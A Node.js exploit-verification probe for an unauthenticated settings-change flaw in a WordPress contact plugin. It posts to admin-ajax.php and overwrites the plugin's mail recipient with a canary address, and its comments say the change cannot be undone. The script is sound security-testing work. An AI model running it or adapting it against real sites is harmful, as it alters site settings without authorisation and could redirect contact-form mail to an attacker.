// Exploit-verification probe: Quick Contact <= 1.0.0 missing authorization on
// the qc_save_settings AJAX action (unauthenticated update of qc_recipient).
//
// Usage: node probe.mjs <base-url>
// Exit 0 = target is exploitable (vulnerable). Exit 1 = not exploitable / could not confirm.
//
// Notes:
//  - Only requests to the given base URL's origin are sent. No filesystem writes.
//  - The request is sent without cookies or a nonce, i.e. as an anonymous visitor.
//  - The plugin does not expose the stored recipient unauthenticated, and the
//    original value cannot be read, so the probe cannot restore the prior value.
//    It writes one canary recipient address (an RFC 2606 .invalid domain).

import { randomBytes } from 'node:crypto';

function fail(msg) {
  process.stderr.write(`probe: ${msg}\n`);
  process.exit(1);
}

const raw = process.argv[2];
if (!raw) fail('usage: node probe.mjs <base-url>');

let base;
try {
  base = new URL(raw);
} catch {
  fail(`invalid base URL: ${raw}`);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  fail('base URL must be http or https');
}

const endpoint = new URL('/wp-admin/admin-ajax.php', base.origin);
const canary = `qc-probe-${randomBytes(6).toString('hex')}@example.invalid`;

const body = new URLSearchParams({
  action: 'qc_save_settings',
  recipient: canary,
});

let res;
let text;
try {
  res = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      Accept: 'application/json',
    },
    body: body.toString(),
    redirect: 'manual',
    signal: AbortSignal.timeout(15000),
  });
  text = await res.text();
} catch (err) {
  fail(`request to ${endpoint.origin} failed: ${err && err.message ? err.message : err}`);
}

let json = null;
try {
  json = JSON.parse(text.trim());
} catch {
  json = null;
}

// Vulnerable: an anonymous request is accepted and the handler reports success.
// Patched: the action is unregistered or refused for anonymous users, so the
// response is an error (for example "0" with HTTP 400, or "-1"/403).
const vulnerable = res.status === 200 && json !== null && json.success === true;

if (vulnerable) {
  process.stdout.write(
    `VULNERABLE: anonymous qc_save_settings accepted (HTTP ${res.status}, body ${text.trim()}). ` +
      `Canary recipient ${canary} written.\n`,
  );
  process.exit(0);
}

process.stdout.write(
  `NOT VULNERABLE: anonymous qc_save_settings rejected (HTTP ${res.status}, body ${text.trim().slice(0, 200)}).\n`,
);
process.exit(1);
